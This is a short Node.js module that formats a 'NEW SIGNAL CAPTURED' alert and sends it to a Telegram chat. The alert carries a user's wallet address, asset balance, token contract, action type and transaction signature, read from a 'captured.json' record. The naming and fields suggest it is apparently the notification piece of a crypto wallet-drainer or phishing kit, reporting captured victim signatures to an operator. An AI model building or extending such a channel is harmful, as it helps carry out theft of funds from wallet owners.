const TelegramBot = require("node-telegram-bot-api");
const dotenv = require("dotenv");
dotenv.config();

// Create Bot instance (polling false usually for simple notification scripts)
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });

/**
 * Generates an explorer link based on the chain
 */
const getExplorerLink = (chain, signature) => {
  if (!signature) return "#";
  const c = chain?.toLowerCase();
  if (c === 'solana') return `https://solscan.io/tx/${signature}`;
  if (c === 'ethereum' || c === 'eth') return `https://etherscan.io/tx/${signature}`;
  if (c === 'bnb' || c === 'bsc') return `https://bscscan.com/tx/${signature}`;
  if (c === 'polygon') return `https://polygonscan.com/tx/${signature}`;
  return "#";
};

/**
 * Sends a structured alert to Telegram
 * @param {Object} data - The captured data object (from captured.json)
 */
const sendTelegramAlert = async (data) => {
  try {
    const { user, chainId, payload, asset, signature, timestamp } = data;
    
    // Formatting Helpers
    const amount = asset?.formattedBalance 
      ? parseFloat(asset.formattedBalance).toLocaleString() 
      : "0";
    
    const symbol = asset?.symbol || "UNKNOWN";
    const type = payload?.type || "UNKNOWN_ACTION";
    const network = chainId ? chainId.toUpperCase() : "UNKNOWN";
    const explorerUrl = getExplorerLink(chainId, signature);
    const shortUser = user ? `${user.slice(0, 6)}...${user.slice(-4)}` : "Unknown";
    const time = new Date(timestamp || Date.now()).toLocaleTimeString();

    // Construct Message
    const message = `
🚨 <b>NEW SIGNAL CAPTURED</b> 🚨

👤 <b>User:</b> <code>${user}</code>
🔗 <b>Chain:</b> ${network}
⚡ <b>Action:</b> ${type}

💰 <b>Asset:</b> ${amount} ${symbol}
📝 <b>Contract:</b> <code>${asset?.address || "N/A"}</code>

🔑 <b>Signature / Hash:</b>
<code>${signature}</code>

<a href="${explorerUrl}">🔎 View on Explorer</a>
    `;

    // Send Message
    await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, {
      parse_mode: "HTML",
      disable_web_page_preview: true,
    });

    console.log("✅ Telegram alert sent successfully.");

  } catch (error) {
    console.error("❌ Failed to send Telegram alert:", error.message);
  }
};

module.exports = sendTelegramAlert;